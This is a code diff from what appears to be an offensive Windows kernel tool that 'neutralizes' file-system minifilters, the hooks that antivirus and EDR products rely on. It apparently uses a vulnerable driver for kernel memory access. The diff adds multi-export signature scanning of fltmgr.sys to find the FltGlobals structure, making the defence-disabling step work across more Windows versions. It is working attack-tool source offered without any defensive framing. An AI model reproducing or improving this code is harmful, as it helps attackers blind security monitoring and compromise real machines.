@@ -2975,39 +2975,62 @@ static uint64_t FindRet0Stub(uint64_t fltmgrBase, uint64_t fltmgrSize) {
     return 0;
 }
 
-// 通过 sigscan 在 FltEnlistFilterForDriverInterface 中查找 FltGlobals
-// 模式: LEA RCX, [RIP + xx xx xx xx] → 目标地址 = RIP(下条指令) + rel32
-uint64_t MinifilterNeutralizer::FindFltGlobals(uint64_t fltmgrBase) {
+// BUILD 455: 辅助函数 — 从 fltmgr 函数体中 sigscan 查找 FltGlobals
+// 模式: LEA RXX, [RIP + xx xx xx xx] → 目标在 fltmgr .data 段
+static uint64_t ScanFuncForFltGlobals(uint64_t fltmgrBase, uint64_t targetFunc) {
     auto& kma = KernelMemoryAccessor::Instance();
-
-    // 解析 fltmgr.sys PE 导出表, 找 FltEnlistFilterForDriverInterface
-    uint64_t targetFunc = kma.ResolveExport(fltmgrBase, "FltEnlistFilterForDriverInterface");
-    if (!targetFunc) {
-        ByovdDiag("FLT:NTRL: FltEnlistFilterForDriverInterface not found\n");
-        return 0;
-    }
-
-    // 读取函数体前 512 字节
     uint8_t buf[512] = {};
-    if (!kma.ReadKernelVA(targetFunc, buf, sizeof(buf))) {
-        ByovdDiag("FLT:NTRL: cannot read FltEnlistFilterForDriverInterface body\n");
+    if (!kma.ReadKernelVA(targetFunc, buf, sizeof(buf)))
         return 0;
-    }
 
-    // 搜索: 48 8D 0D ?? ?? ?? ?? (LEA RCX, [RIP+rel32])
     for (int i = 0; i < 500; i++) {
-        if (buf[i] == 0x48 && buf[i+1] == 0x8D && buf[i+2] == 0x0D) {
+        // 48 8D 0D (LEA RCX, [RIP+rel32]) — 最常见的 FltGlobals 引用
+        // 也匹配 48 8D 15 (LEA RDX) / 48 8D 1D (LEA RBX) / 48 8D 2D (LEA RBP) 等
+        if (buf[i] == 0x48 && buf[i+1] == 0x8D && (buf[i+2] & 0xC7) == 0x05) {
             int32_t rel32 = *(int32_t*)(buf + i + 3);
             uint64_t candidate = targetFunc + i + 7 + rel32;
-            // FltGlobals 在 fltmgr.sys 的 .data 段中 (基址+0x100000 ~ +0x400000)
             if (candidate > fltmgrBase + 0x100000 && candidate < fltmgrBase + 0x400000) {
-                ByovdDiag("FLT:NTRL: FltGlobals at 0x%llX (+%d in func)\n",
-                    (unsigned long long)candidate, i);
+                return candidate;
+            }
+        }
+        // 4C 8D 05 / 4C 8D 0D (LEA R8/R9, [RIP+rel32])
+        if (buf[i] == 0x4C && buf[i+1] == 0x8D && (buf[i+2] & 0xC7) == 0x05) {
+            int32_t rel32 = *(int32_t*)(buf + i + 3);
+            uint64_t candidate = targetFunc + i + 7 + rel32;
+            if (candidate > fltmgrBase + 0x100000 && candidate < fltmgrBase + 0x400000) {
                 return candidate;
             }
         }
     }
-    ByovdDiag("FLT:NTRL: FltGlobals pattern not found\n");
+    return 0;
+}
+
+// BUILD 455: 多函数 fallback 查找 FltGlobals
+// FltEnlistFilterForDriverInterface 不是所有 Windows 版本都导出
+uint64_t MinifilterNeutralizer::FindFltGlobals(uint64_t fltmgrBase) {
+    const char* exportNames[] = {
+        "FltEnlistFilterForDriverInterface",  // Win10 21H2+ (主路径)
+        "FltGetVolumeFromName",               // 所有版本通用
+        "FltGetVolumeFromFileObject",         // 所有版本通用
+        "FltRegisterFilter",                  // 所有版本通用 (最可靠)
+        "FltStartFiltering",                  // 所有版本通用
+        "FltInitializePushLock",             // 所有版本通用
+    };
+
+    for (const char* exportName : exportNames) {
+        uint64_t targetFunc = KernelMemoryAccessor::Instance().ResolveExport(fltmgrBase, exportName);
+        if (!targetFunc) {
+            ByovdDiag("FLT:NTRL: %s not found\n", exportName);
+            continue;
+        }
+        uint64_t candidate = ScanFuncForFltGlobals(fltmgrBase, targetFunc);
+        if (candidate) {
+            ByovdDiag("FLT:NTRL: FltGlobals at 0x%llX (via %s)\n",
+                (unsigned long long)candidate, exportName);
+            return candidate;
+        }
+    }
+    ByovdDiag("FLT:NTRL: FltGlobals not found via any export\n");
     return 0;
 }
 
